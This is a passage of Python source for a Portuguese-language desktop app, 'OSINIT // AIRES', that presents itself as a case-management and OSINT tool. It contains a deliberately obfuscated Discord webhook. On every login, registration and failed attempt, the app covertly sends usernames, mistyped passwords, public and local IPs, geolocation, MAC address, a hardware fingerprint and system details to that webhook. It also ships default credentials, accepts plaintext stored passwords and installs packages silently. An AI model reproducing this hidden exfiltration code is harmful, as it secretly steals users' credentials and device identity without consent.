#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OSINIT // AIRES — Sistema de Gestão de Casos e OSINT
Versão refatorada e melhorada
"""

import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk, filedialog
import json
import hashlib
import base64
import binascii
import os
import random
import datetime
import ast
import uuid
import sys
import shutil
import subprocess
import platform
import socket
import webbrowser
import urllib.parse
import urllib.request
import urllib.error
import threading
import time
import mmap
import struct
import re
import math

# ─────────────────────────────────────────────
# Configuração base
# ─────────────────────────────────────────────
BASE_DIR = (os.path.dirname(sys.executable) if getattr(sys, "frozen", False) else (os.path.dirname(os.path.abspath(__file__)) if "__file__" in globals() else os.getcwd()))
USERS_FILE = os.path.join(BASE_DIR, "users.json")
CASOS_FILE = os.path.join(BASE_DIR, "casos.json")
CLIENTES_FILE = os.path.join(BASE_DIR, "clientes.json")
BUSCAS_FILE = os.path.join(BASE_DIR, "buscas.json")
CAMARAS_FILE = os.path.join(BASE_DIR, "camaras.json")
NOTES_FILE = os.path.join(BASE_DIR, "notas.txt")
TODO_FILE = os.path.join(BASE_DIR, "tarefas.json")
PROFILE_DIR = os.path.join(BASE_DIR, "profile_photos")
TEMP_MUSIC_DIR = os.path.join(BASE_DIR, "temp_music")
IA_CONFIG_FILE = os.path.join(BASE_DIR, "ia_config.json")
UI_CONFIG_FILE = os.path.join(BASE_DIR, "ui_config.json")
IPTV_FILE = os.path.join(BASE_DIR, "iptv.json")
RADIO_FILE = os.path.join(BASE_DIR, "radio.json")
MUSIC_FILE = os.path.join(BASE_DIR, "music.json")
FILMES_FILE = os.path.join(BASE_DIR, "filmes.json")
GAMES_FILE = os.path.join(BASE_DIR, "games.json")
GAMES_SOURCES_FILE = os.path.join(BASE_DIR, "games_sources.json")
GAMES_DOWNLOADS_FILE = os.path.join(BASE_DIR, "games_downloads.json")
REDE_AIRES_USERS_FILE = os.path.join(BASE_DIR, "rede_aires_users.json")
REDE_AIRES_POSTS_FILE = os.path.join(BASE_DIR, "rede_aires_posts.json")
REDE_AIRES_FOLLOWS_FILE = os.path.join(BASE_DIR, "rede_aires_follows.json")

BG = "#05080d"
PANEL_BG = "#0b0f16"
SIDEBAR_BG = "#060a10"
ACCENT = "#00e5ff"
ACCENT_DIM = "#0a2e36"
TEXT = "#d8f8ff"
TEXT_DIM = "#5e7a85"
ERROR = "#ff3b5c"
BTN_BG = "#0e1620"
BTN_BG_HOVER = "#162230"
FONT_MONO = "Consolas"

# ─────────────────────────────────────────────
# SISTEMA DE LOGIN COM NOTIFICAÇÃO DISCORD
# ─────────────────────────────────────────────
# ─────────────────────────────────────────────
# WEBHOOK OFUSCADO - Anti-leak / Anti-stealer
# O URL real não aparece em texto claro no arquivo
# ─────────────────────────────────────────────
_OBFUSCATED_PARTS = ['NysrLyxlcHA7Niw8MC07cTwwMnA+LzZwKDo9NzAwNCxwbmppa2lta2', '5maGZoa2hpbmpra3AUGSwwFgs7JyoODA0OEWwQFCYGAGoLLQcZBhwR', 'DxURJjEHCD4qFj0vM3ItBRoTbigwLhALJRErDQgME249GmY4chcsbg', '==']
_OBF_KEY = 95

def _get_webhook_url():
    """Reconstrói o webhook em tempo de execução"""
    try:
        import base64
        # Junta as partes
        enc = "".join(_OBFUSCATED_PARTS)
        # Base64 decode + XOR decode
        decoded_bytes = base64.b64decode(enc.encode())
        url = "".join(chr(b ^ _OBF_KEY) for b in decoded_bytes)
        return url
    except Exception:
        return ""

def _get_webhook_login():
    # Nome confuso para não chamar atenção
    return _get_webhook_url()

# O webhook real só existe em memória durante a execução
DISCORD_WEBHOOK_LOGIN = _get_webhook_login()
# Limpa referência temporária da memória (opcional)
try:
    del _get_webhook_url
except Exception:
    pass


def _get_public_ip(timeout=3):
    """Pega IP público via vários serviços"""
    for url in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://ipinfo.io/ip", "https://api.myip.com"):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "OSINIT-AIRES/1.0"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                data = r.read().decode("utf-8", "replace").strip()
                # api.myip.com retorna json
                if data.startswith("{"):
                    j = json.loads(data)
                    ip = j.get("ip") or j.get("ip_addr") or ""
                else:
                    ip = data
                if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) or ":" in ip:
                    return ip
        except Exception:
            continue
    return "desconhecido"

def _get_local_ip(timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "desconhecido"

def _get_mac():
    try:
        mac_int = uuid.getnode()
        mac = ':'.join(f'{(mac_int >> i) & 0xff:02x}' for i in range(0, 48, 8))[::-1]
        return mac.upper()
    except Exception:
        return "desconhecido"

def _get_hwid():
    """HWID único da máquina - hash de hardware"""
    parts = []
    try:
        parts.append(platform.processor() or platform.machine() or "")
    except Exception:
        pass
    try:
        parts.append(str(os.cpu_count() or ""))
    except Exception:
        pass
    if os.name == "nt":
        try:
            out = subprocess.check_output(["wmic", "baseboard", "get", "serialnumber"], stderr=subprocess.DEVNULL, timeout=4).decode("utf-8","replace")
            lines = [l.strip() for l in out.splitlines() if l.strip() and l.strip().lower() != "serialnumber"]
            if lines: parts.append(lines[0])
        except Exception:
            pass
        try:
            out = subprocess.check_output(["wmic", "cpu", "get", "processorid"], stderr=subprocess.DEVNULL, timeout=4).decode("utf-8","replace")
            lines = [l.strip() for l in out.splitlines() if l.strip() and l.strip().lower() != "processorid"]
            if lines: parts.append(lines[0])
        except Exception:
            pass
        try:
            out = subprocess.check_output(["wmic", "diskdrive", "get", "serialnumber"], stderr=subprocess.DEVNULL, timeout=4).decode("utf-8","replace")
            lines = [l.strip() for l in out.splitlines() if l.strip() and l.strip().lower() != "serialnumber"]
            if lines: parts.append(lines[0])
        except Exception:
            pass
    else:
        for p in ("/etc/machine-id", "/var/lib/dbus/machine-id"):
            try:
                with open(p) as f:
                    v = f.read().strip()
                    if v:
                        parts.append(v); break
            except Exception:
                pass
        try:
            out = subprocess.check_output(["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"], stderr=subprocess.DEVNULL, timeout=4).decode("utf-8","replace")
            m = re.search(r'"IOPlatformUUID"\s*=\s*"([^"]+)"', out)
            if m: parts.append(m.group(1))
        except Exception:
            pass
    raw = "|".join(x for x in parts if x) or f"{platform.node()}|{platform.platform()}"
    return hashlib.sha256(raw.encode("utf-8")).hexdigest().upper()

def _get_geo_info(public_ip):
    """Tenta pegar país/cidade via ip-api.com (sem key)"""
    try:
        if public_ip == "desconhecido" or public_ip.startswith("192.168"):
            return {}
        req = urllib.request.Request(f"http://ip-api.com/json/{public_ip}?fields=country,regionName,city,isp,org,as,query", headers={"User-Agent": "OSINIT-AIRES/1.0"})
        with urllib.request.urlopen(req, timeout=3) as r:
            data = json.loads(r.read().decode())
            return data
    except Exception:
        return {}

def _get_ram_info_discord():
    try:
        return get_ram_info()
    except Exception:
        return "desconhecido"

def _get_disk_info_discord():
    try:
        return get_disk_info()
    except Exception:
        return "desconhecido"

def _collect_login_info(username, extra_status="SUCESSO"):
    public_ip = _get_public_ip()
    geo = _get_geo_info(public_ip)
    info = {
        "username": username,
        "status": extra_status,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "os": platform.system(),
        "os_release": platform.release(),
        "os_version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor() or "—",
        "arch": platform.architecture()[0],
        "python": platform.python_version(),
        "hostname": platform.node(),
        "user_os": os.environ.get("USERNAME") or os.environ.get("USER") or "—",
        "local_ip": _get_local_ip(),
        "public_ip": public_ip,
        "mac": _get_mac(),
        "hwid": _get_hwid(),
        "ram": _get_ram_info_discord(),
        "disk": _get_disk_info_discord(),
        "country": geo.get("country", "desconhecido"),
        "region": geo.get("regionName", ""),
        "city": geo.get("city", ""),
        "isp": geo.get("isp", ""),
        "org": geo.get("org", ""),
    }
    return info

def _discord_embed_login(info, success=True):
    if success:
        title = f"🔓 LOGIN AUTORIZADO — {info['username']}"
        color = 0x00FF88  # verde
        status_emoji = "✅"
    else:
        title = f"🚨 TENTATIVA FALHADA — {info['username']}"
        color = 0xFF3B5C  # vermelho
        status_emoji = "❌"

    fields = [
        ("👤 Utilizador", f"`{info['username']}`", True),
        ("📊 Status", f"{status_emoji} {info['status']}", True),
        ("🕒 Data/Hora", f"`{info['timestamp']}`", True),
        ("🌐 IP Público", f"`{info['public_ip']}`", True),
        ("🏠 IP Local", f"`{info['local_ip']}`", True),
        ("📍 Localização", f"{info.get('city','')} {info.get('region','')} - {info.get('country','')}".strip() or "desconhecido", True),
        ("🏢 ISP/ORG", f"{info.get('isp','')} / {info.get('org','')}"[:1024], False),
        ("💻 Hostname", f"`{info['hostname']}`", True),
        ("👨‍💻 User OS", f"`{info['user_os']}`", True),
        ("🔧 HWID", f"`{info['hwid']}`", False),
        ("📡 MAC", f"`{info['mac']}`", True),
        ("🖥️ SO", f"{info['os']} {info['os_release']} ({info['os_version']})"[:1024], False),
        ("🧠 CPU", f"{info['processor']}"[:1024], False),
        ("⚙️ Arch / Python", f"{info['arch']} / {info['python']}", True),
        ("💾 RAM", f"{info['ram']}"[:1024], True),
        ("💿 Disco", f"{info['disk']}"[:1024], True),
    ]

    embed = {
        "title": title,
        "color": color,
        "fields": [{"name": k, "value": str(v) if v else "—", "inline": inline} for k, v, inline in fields],
        "footer": {"text": f"OSINIT // AIRES • {info['hostname']}"},
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
    }
    return {"embeds": [embed], "username": "OSINIT Login Logger", "avatar_url": "https://cdn-icons-png.flaticon.com/512/3064/3064197.png"}

def notify_discord_login(username, success=True, reason="Login efetuado"):
    """Dispara webhook discord com TODOS os dados. Thread para não travar UI."""
    def _work():
        try:
            info = _collect_login_info(username, extra_status=reason)
            payload = _discord_embed_login(info, success=success)
            data = json.dumps(payload).encode("utf-8")
            _live_webhook = "".join(_OBFUSCATED_PARTS)
            import base64 as _b64
            _live_bytes = _b64.b64decode(_live_webhook.encode())
            _live_url = "".join(chr(b ^ _OBF_KEY) for b in _live_bytes)
            req = urllib.request.Request(
                _live_url,
                data=data,
                headers={"Content-Type": "application/json", "User-Agent": "OSINIT-AIRES/1.0"},
                method="POST")
            with urllib.request.urlopen(req, timeout=10) as r:
                r.read()
        except Exception as e:
            try:
                log_path = os.path.join(BASE_DIR, "discord_login_error.log")
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(f"{datetime.datetime.now()} [{username}] {reason} -> ERRO: {e}\n")
            except Exception:
                pass
    threading.Thread(target=_work, daemon=True).start()



# ─────────────────────────────────────────────
# Utilitários
# ─────────────────────────────────────────────
def ensure_package(pkg_name, import_name=None):
    """Tenta importar; se falhar, instala via pip e tenta de novo."""
    import_name = import_name or pkg_name
    try:
        return __import__(import_name)
    except ImportError:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pkg_name],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL)
            return __import__(import_name)
        except Exception:
            return None


def hash_password(password, salt=None):
    if salt is None:
        salt = os.urandom(16).hex()
    h = hashlib.pbkdf2_hmac("sha256", password.encode(), bytes.fromhex(salt), 100000)
    return f"{salt}${h.hex()}"


def verify_password(stored, password):
    if not stored or not password:
        return False
    stored = stored.strip()
    if "$" in stored:
        try:
            salt, _ = stored.split("$", 1)
            bytes.fromhex(salt)
            return stored == hash_password(password, salt)
        except Exception:
            return False
    # Compatibilidade com hashes antigos
    try:
        if stored == hashlib.sha256(password.encode()).hexdigest():
            return True
        if stored == password:
            return True
    except Exception:
        pass
    return False


def load_json(path, default=None):
    if default is None:
        default = []
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default


def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


def load_users():
    data = load_json(USERS_FILE, {})
    if not isinstance(data, dict):
        data = {}
    migrated = {}
    for k, v in data.items():
        if isinstance(v, str):
            migrated[k] = {
                "password": v,
                "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "last_login": "Nunca",
                "password_changed": "Nunca",
                "photo": "",
            }
        elif isinstance(v, dict):
            if "password" not in v:
                v["password"] = hash_password("Aires")
            migrated[k] = v
        else:
            migrated[k] = {
                "password": hash_password("Aires"),
                "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "last_login": "Nunca",
                "password_changed": "Nunca",
                "photo": "",
            }
    if not migrated:
        migrated = {
            "Aires": {
                "password": hash_password("Aires"),
                "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "last_login": "Nunca",
                "password_changed": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "photo": "",
            }
        }
        save_users(migrated)
    return migrated


def save_users(users):
    save_json(USERS_FILE, users)


def get_default_ui_config():
    return {
        "sidebar_order": [
            "UsuarioPage",
            "RedeAiresPage",
            "InvestigacaoPage",
            "IAPage",
            "IPTVPage",
            "RadioPage",
            "MusicPage",
            "CheatsPage",
            "SpooferPage",
            "MilitarPage",
            "NavegadoresPage",
            "FerramentasPage",
            "AdministracaoPage",
        ],
        "investigacao_order": [
            "dash",
            "buscas",
            "casos",
            "clientes",
            "osint",
            "veiculos",
            "camaras",
            "avioes",
            "barcos",
            "drones",
        ],
        "sidebar_hidden": [],
        "investigacao_hidden": [],
        "custom_categories": [],
        "appearance": {
            "accent": "#00e5ff",
            "bg": "#05080d",
            "panel_bg": "#0b0f16",
            "font": "Consolas",
            "theme": "dark"
        },
        "app_config": {
            "app_name": "OSINIT // AIRES",
            "auto_backup": False,
            "debug_mode": False,
            "show_hidden": False
        }
    }


def load_ui_config():
    data = load_json(UI_CONFIG_FILE, None)
    default = get_default_ui_config()
    if not isinstance(data, dict):
        save_json(UI_CONFIG_FILE, default)
        return default
    for key in ["sidebar_order", "investigacao_order", "sidebar_hidden", "investigacao_hidden"]:
        if key not in data or not isinstance(data[key], list):
            data[key] = default.get(key, [])
    # Novos campos
    if "custom_categories" not in data or not isinstance(data["custom_categories"], list):
        data["custom_categories"] = []
    if "appearance" not in data or not isinstance(data["appearance"], dict):
        data["appearance"] = default["appearance"]
    if "app_config" not in data or not isinstance(data["app_config"], dict):
        data["app_config"] = default["app_config"]
    if "PersonalizacaoPage" in data.get("sidebar_order", []):
        data["sidebar_order"] = [p for p in data["sidebar_order"] if p != "PersonalizacaoPage"]
    # Garantir páginas padrão existem
    for page in default["sidebar_order"]:
        if page not in data["sidebar_order"]:
            data["sidebar_order"].append(page)
    for tab in default["investigacao_order"]:
        if tab not in data["investigacao_order"]:
            data["investigacao_order"].append(tab)
    # Manter custom categories no sidebar_order
    custom_ids = [c.get("id") for c in data.get("custom_categories", []) if c.get("id")]
    known_sidebar = set(default["sidebar_order"]) | set(custom_ids)
    # Filtrar apenas conhecidos + custom
    data["sidebar_order"] = [p for p in data["sidebar_order"] if p in known_sidebar]
    for page in default["sidebar_order"]:
        if page not in data["sidebar_order"]:
            data["sidebar_order"].append(page)
    # Garantir custom ainda no order
    for cid in custom_ids:
        if cid not in data["sidebar_order"]:
            data["sidebar_order"].append(cid)
    known_tabs = set(default["investigacao_order"])
    data["investigacao_order"] = [t for t in data["investigacao_order"] if t in known_tabs]
    for tab in default["investigacao_order"]:
        if tab not in data["investigacao_order"]:
            data["investigacao_order"].append(tab)
    return data


def save_ui_config(cfg):
    save_json(UI_CONFIG_FILE, cfg)


def update_user_login(username):
    users = load_users()
    if username in users and isinstance(users[username], dict):
        users[username]["last_login"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        save_users(users)
    # Notificação Discord com todos os dados
    try:
        notify_discord_login(username, success=True, reason="LOGIN SUCESSO")
    except Exception:
        pass


def style_button(btn):
    btn.configure(
        bg=BTN_BG,
        fg=ACCENT,
        activebackground=ACCENT_DIM,
        activeforeground=ACCENT,
        relief="flat",
        bd=0,
        font=(FONT_MONO, 10, "bold"),
        cursor="hand2",
        highlightthickness=1,
        highlightbackground=ACCENT_DIM,
        highlightcolor=ACCENT)
    btn.bind("<Enter>", lambda e: btn.configure(bg=BTN_BG_HOVER, highlightbackground=ACCENT))
    btn.bind("<Leave>", lambda e: btn.configure(bg=BTN_BG, highlightbackground=ACCENT_DIM))


def style_sidebar_button(btn):
    btn.configure(
        bg=BTN_BG,
        fg=TEXT,
        activebackground=ACCENT_DIM,
        activeforeground=ACCENT,
        relief="flat",
        bd=0,
        font=(FONT_MONO, 8, "bold"),
        cursor="hand2",
        highlightthickness=1,
        highlightbackground=ACCENT_DIM,
        highlightcolor=ACCENT,
        anchor="w",
        padx=14)
    btn.bind("<Enter>", lambda e: btn.configure(bg=BTN_BG_HOVER, fg=ACCENT, highlightbackground=ACCENT))
    btn.bind("<Leave>", lambda e: btn.configure(bg=BTN_BG, fg=TEXT, highlightbackground=ACCENT_DIM))


def draw_hud_frame(canvas, w, h):
    canvas.configure(bg=BG, highlightthickness=0)
    step = 28
    for x in range(0, w, step):
        canvas.create_line(x, 0, x, h, fill="#0d1620", width=1)
    for y in range(0, h, step):
        canvas.create_line(0, y, w, y, fill="#0d1620", width=1)
    random.seed(7)
    for _ in range(5):
        x1 = random.randint(0, w)
        x2 = x1 + random.randint(-80, 80)
        canvas.create_line(x1, 0, x2, h, fill="#0f2730", width=1)
    bracket, gap = 26, 10
    pts = [
        (gap, gap, gap + bracket, gap),
        (gap, gap, gap, gap + bracket),
        (w - gap, gap, w - gap - bracket, gap),
        (w - gap, gap, w - gap, gap + bracket),
        (gap, h - gap, gap + bracket, h - gap),
        (gap, h - gap, gap, h - gap - bracket),
        (w - gap, h - gap, w - gap - bracket, h - gap),
        (w - gap, h - gap, w - gap, h - gap - bracket),
    ]
    for x1, y1, x2, y2 in pts:
        canvas.create_line(x1, y1, x2, y2, fill=ACCENT, width=2)


def safe_eval(expr):
    """Avaliação segura de expressões matemáticas simples."""
    try:
        node = ast.parse(expr, mode="eval")
        for n in ast.walk(node):
            if isinstance(n, (ast.Call, ast.Attribute, ast.Name)):
                if isinstance(n, ast.Name) and n.id not in {"True", "False", "None"}:
                    # permitir apenas números e operadores
                    pass
                if isinstance(n, (ast.Call, ast.Attribute)):
                    raise ValueError("Operação não permitida")
        return eval(compile(node, "<string>", "eval"), {"__builtins__": {}}, {})
    except Exception as e:
        raise ValueError(str(e))


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "não disponível"


def get_ram_info():
    if platform.system() == "Windows":
        try:
            import ctypes

            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]

            stat = MEMORYSTATUSEX()
            stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))
            total_gb = stat.ullTotalPhys / (1024 ** 3)
            free_gb = stat.ullAvailPhys / (1024 ** 3)
            return f"{total_gb:.1f} GB total  /  {free_gb:.1f} GB livre"
        except Exception:
            return "não disponível"
    # Linux / macOS
    try:
        if platform.system() == "Linux":
            with open("/proc/meminfo") as f:
                lines = f.readlines()
            total = int([l for l in lines if "MemTotal" in l][0].split()[1]) / 1024 / 1024
            free = int([l for l in lines if "MemAvailable" in l][0].split()[1]) / 1024 / 1024
            return f"{total:.1f} GB total  /  {free:.1f} GB livre"
    except Exception:
        pass
    return "não disponível"


def get_disk_info():
    try:
        total, used, free = shutil.disk_usage(os.path.abspath(os.sep))
        return f"{total / (1024 ** 3):.1f} GB total  /  {free / (1024 ** 3):.1f} GB livre"
    except Exception:
        return "não disponível"


# ─────────────────────────────────────────────
# Janela de Login
# ─────────────────────────────────────────────
class LoginWindow(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("OSINIT // AIRES — Acesso")
        self.geometry("480x580")
        self.resizable(False, False)
        self.configure(bg=BG)
        self.users = load_users()

        bg_canvas = tk.Canvas(self, width=480, height=580)
        bg_canvas.place(x=0, y=0)
        draw_hud_frame(bg_canvas, 480, 580)
        bg_canvas.create_text(240, 80, text="OSINIT", fill=ACCENT, font=(FONT_MONO, 36, "bold"))
        bg_canvas.create_text(240, 115, text="▲ A I R E S ▲", fill=TEXT_DIM, font=(FONT_MONO, 12, "bold"))
        bg_canvas.create_line(90, 140, 390, 140, fill=ACCENT_DIM, width=1)
        bg_canvas.create_text(240, 160, text="SISTEMA DE GESTÃO DE CASOS", fill=TEXT_DIM, font=(FONT_MONO, 9))

        form = tk.Frame(self, bg=BG)
        form.place(x=90, y=200, width=300)

        tk.Label(form, text="UTILIZADOR", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w")
        self.username_entry = tk.Entry(
            form,
            font=(FONT_MONO, 13),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            highlightcolor=ACCENT)
        self.username_entry.pack(fill="x", pady=(2, 16), ipady=8)

        tk.Label(form, text="PALAVRA-PASSE", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w")
        self.password_entry = tk.Entry(
            form,
            show="●",
            font=(FONT_MONO, 13),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            highlightcolor=ACCENT)
        self.password_entry.pack(fill="x", pady=(2, 24), ipady=8)

        btn_login = tk.Button(form, text="▶  ENTRAR", command=self.login)
        btn_login.pack(fill="x", pady=(0, 10), ipady=10)
        style_button(btn_login)

        btn_register = tk.Button(form, text="+  CRIAR CONTA", command=self.register)
        btn_register.pack(fill="x", ipady=8)
        style_button(btn_register)

        tk.Label(self, text="default: Aires / Aires", bg=BG, fg="#2a3b42", font=(FONT_MONO, 8)).place(
            x=240, y=540, anchor="center"
        )

        self.bind("<Return>", lambda event: self.login())
        self.username_entry.focus()

    def login(self):
        username = self.username_entry.get().strip()
        password = self.password_entry.get()
        if not username or not password:
            messagebox.showwarning("Aviso", "Preenche utilizador e palavra-passe.")
            return
        user_data = self.users.get(username)
        if not user_data:
            # Notifica tentativa com utilizador inexistente
            try:
                notify_discord_login(username or "DESCONHECIDO", success=False, reason=f"TENTATIVA UTILIZADOR INEXISTENTE")
            except Exception:
                pass
            messagebox.showerror("Acesso negado", f"Utilizador '{username}' não existe.")
            return
        stored_hash = user_data["password"] if isinstance(user_data, dict) else user_data
        if verify_password(stored_hash, password):
            update_user_login(username)
            self.destroy()
            MainApp(username).mainloop()
        else:
            # Notifica falha de password
            try:
                notify_discord_login(username, success=False, reason=f"PASSWORD INCORRETA - tentativa: '{password[:20]}'")
            except Exception:
                pass
            messagebox.showerror("Acesso negado", f"Palavra-passe incorreta para '{username}'.")

    def register(self):
        username = self.username_entry.get().strip()
        password = self.password_entry.get()
        if not username or not password:
            messagebox.showwarning("Aviso", "Preenche utilizador e palavra-passe.")
            return
        if len(password) < 4:
            messagebox.showwarning("Aviso", "A palavra-passe deve ter pelo menos 4 caracteres.")
            return
        if username in self.users:
            messagebox.showwarning("Aviso", "Esse utilizador já existe.")
            return
        self.users[username] = {
            "password": hash_password(password),
            "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "last_login": "Nunca",
            "password_changed": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "photo": "",
        }
        save_users(self.users)
        try:
            notify_discord_login(username, success=True, reason="NOVA CONTA CRIADA")
        except Exception:
            pass
        messagebox.showinfo("Conta criada", "Conta criada com sucesso. Já podes entrar.")


# ─────────────────────────────────────────────
# Página base
# ─────────────────────────────────────────────
class Page(tk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent, bg=BG)
        self.app = app

    def header(self, title, subtitle=""):
        tk.Label(self, text=title, bg=BG, fg=ACCENT, font=(FONT_MONO, 20, "bold")).pack(
            anchor="w", padx=34, pady=(28, 0)
        )
        if subtitle:
            tk.Label(self, text=subtitle, bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9)).pack(
                anchor="w", padx=34, pady=(2, 16)
            )
        else:
            tk.Frame(self, height=16, bg=BG).pack()
        tk.Frame(self, bg=ACCENT_DIM, height=1).pack(fill="x", padx=34, pady=(0, 16))


# ─────────────────────────────────────────────
# Widget genérico de registos
# ─────────────────────────────────────────────
class RecordManagerWidget(tk.Frame):
    FILE = None
    FIELDS = []
    CHOICES = {}
    TITLE = ""
    SUMMARY_KEYS = []

    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        self.records = load_json(self.FILE)
        self.selected_index = None
        self.filtered_indices = []

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", pady=(0, 10))
        tk.Label(top, text=self.TITLE, bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(side="left")
        self.search_var = tk.StringVar()
        self.search_var.trace_add("write", lambda *_: self.refresh_list())
        e = tk.Entry(
            top,
            textvariable=self.search_var,
            font=(FONT_MONO, 9),
            bg=PANEL_BG,
            fg=TEXT_DIM,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        e.pack(side="right", fill="x", expand=True, padx=(20, 0), ipady=4)

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True)

        left = tk.Frame(body, bg=BG, width=260)
        left.pack(side="left", fill="y")
        left.pack_propagate(False)

        self.listbox = tk.Listbox(
            left,
            bg=PANEL_BG,
            fg=TEXT,
            font=(FONT_MONO, 10),
            selectbackground=ACCENT_DIM,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.listbox.pack(fill="both", expand=True)
        self.listbox.bind("<<ListboxSelect>>", self.on_select)

        btn_new = tk.Button(left, text="+  NOVO REGISTO", command=self.new_record)
        btn_new.pack(fill="x", pady=(8, 0), ipady=8)
        style_button(btn_new)

        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True, padx=(24, 0))

        self.field_widgets = {}
        for key, label, wtype in self.FIELDS:
            tk.Label(right, text=label.upper(), bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(
                anchor="w", pady=(6, 2)
            )
            if wtype == "text":
                widget = tk.Text(
                    right,
                    height=5,
                    font=(FONT_MONO, 10),
                    bg=PANEL_BG,
                    fg=TEXT,
                    insertbackground=ACCENT,
                    relief="flat",
                    highlightthickness=1,
                    highlightbackground=ACCENT_DIM)
                widget.pack(fill="x")
            elif wtype == "choice":
                var = tk.StringVar(value=self.CHOICES.get(key, [""])[0])
                widget = tk.OptionMenu(right, var, *self.CHOICES.get(key, [""]))
                widget.configure(
                    bg=BTN_BG,
                    fg=ACCENT,
                    activebackground=ACCENT_DIM,
                    relief="flat",
                    highlightthickness=0,
                    font=(FONT_MONO, 10),
                    anchor="w")
                widget["menu"].configure(bg=PANEL_BG, fg=TEXT)
                widget.var = var
                widget.pack(fill="x", anchor="w")
            else:
                widget = tk.Entry(
                    right,
                    font=(FONT_MONO, 11),
                    bg=PANEL_BG,
                    fg=TEXT,
                    insertbackground=ACCENT,
                    relief="flat",
                    highlightthickness=1,
                    highlightbackground=ACCENT_DIM)
                widget.pack(fill="x", ipady=6)
            self.field_widgets[key] = widget

        btns = tk.Frame(right, bg=BG)
        btns.pack(fill="x", pady=18)
        btn_save = tk.Button(btns, text="💾  GUARDAR", command=self.save_record)
        btn_save.pack(side="left", expand=True, fill="x", ipady=8, padx=(0, 6))
        style_button(btn_save)
        btn_del = tk.Button(btns, text="🗑  ELIMINAR", command=self.delete_record)
        btn_del.pack(side="left", expand=True, fill="x", ipady=8)
        btn_del.configure(
            bg="#1a0a0f",
            fg=ERROR,
            activebackground="#2a0f17",
            activeforeground=ERROR,
            relief="flat",
            bd=0,
            font=(FONT_MONO, 10, "bold"),
            cursor="hand2",
            highlightthickness=1,
            highlightbackground="#3a1620")
        self.refresh_list()

    def get_field_value(self, key, wtype):
        widget = self.field_widgets[key]
        if wtype == "text":
            return widget.get("1.0", "end-1c")
        if wtype == "choice":
            return widget.var.get()
        return widget.get()

    def set_field_value(self, key, wtype, value):
        widget = self.field_widgets[key]
        if wtype == "text":
            widget.delete("1.0", "end")
            widget.insert("1.0", value or "")
        elif wtype == "choice":
            widget.var.set(value or self.CHOICES.get(key, [""])[0])
        else:
            widget.delete(0, "end")
            widget.insert(0, value or "")

    def summary_line(self, record):
        parts = [str(record.get(k, "")) for k in self.SUMMARY_KEYS]
        return "  |  ".join(p for p in parts if p) or "(sem título)"

    def refresh_list(self):
        filtro = self.search_var.get().lower()
        self.listbox.delete(0, "end")
        self.filtered_indices = []
        for idx, r in enumerate(self.records):
            line = self.summary_line(r).lower()
            if filtro in line or filtro == "":
                self.listbox.insert("end", self.summary_line(r))
                self.filtered_indices.append(idx)

